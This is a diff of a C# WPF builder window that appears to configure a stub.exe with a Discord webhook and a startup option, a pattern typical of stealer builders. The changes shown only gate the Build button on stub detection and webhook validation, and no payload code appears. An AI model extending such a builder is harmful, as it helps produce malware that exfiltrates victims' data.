@@ -1,12 +1,16 @@
-﻿using Microsoft.Win32;
-using System.IO;
+﻿using System.IO;
 using System.Windows;
+using System.Windows.Controls;
+using Microsoft.Win32;
 
 namespace BuilderGUI
 {
     public partial class MainWindow : Window
     {
         private string stubPath;
+        private bool isStubDetected = false;
+        private bool isWebhookValid = false;
+
         public MainWindow()
         {
             InitializeComponent();
@@ -22,14 +26,21 @@ namespace BuilderGUI
             {
                 StubStatusLabel.Text = $"Stub detected at: {stubPath}";
                 StubStatusLabel.Foreground = System.Windows.Media.Brushes.Green;
-                BuildButton.IsEnabled = true;
+                isStubDetected = true;
             }
             else
             {
                 StubStatusLabel.Text = "stub.exe not found! Please place it in the 'Stub' folder.";
                 StubStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
-                BuildButton.IsEnabled = false;
+                isStubDetected = false;
             }
+
+            UpdateBuildButtonState();
+        }
+
+        private void UpdateBuildButtonState()
+        {
+            BuildButton.IsEnabled = isStubDetected && isWebhookValid;
         }
 
         private async void TestWebhookButton_Click(object sender, RoutedEventArgs e)
@@ -45,9 +56,9 @@ namespace BuilderGUI
             WebhookStatusLabel.Text = "Testing webhook...";
             WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Black;
 
-            bool isValid = await Discord.WebhookIsValidAsync(token);
+            isWebhookValid = await Discord.WebhookIsValidAsync(token);
 
-            if (!isValid)
+            if (!isWebhookValid)
             {
                 WebhookStatusLabel.Text = "Invalid webhook URL!";
                 WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
@@ -64,10 +75,21 @@ namespace BuilderGUI
                 {
                     WebhookStatusLabel.Text = "Failed to send test message.";
                     WebhookStatusLabel.Foreground = System.Windows.Media.Brushes.Red;
+                    isWebhookValid = false; // Consider webhook invalid if message fails
                 }
             }
 
+            UpdateBuildButtonState();
+
             TestWebhookButton.IsEnabled = true;
+        }
+
+        private void WebhookUrlTextBox_TextChanged(object sender, TextChangedEventArgs e)
+        {
+            // Since the webhook URL has changed, we need to re-validate it.
+            isWebhookValid = false;
+            UpdateBuildButtonState();
+            WebhookStatusLabel.Text = "";
         }
 
         private void StartupCheckBox_Checked(object sender, RoutedEventArgs e)
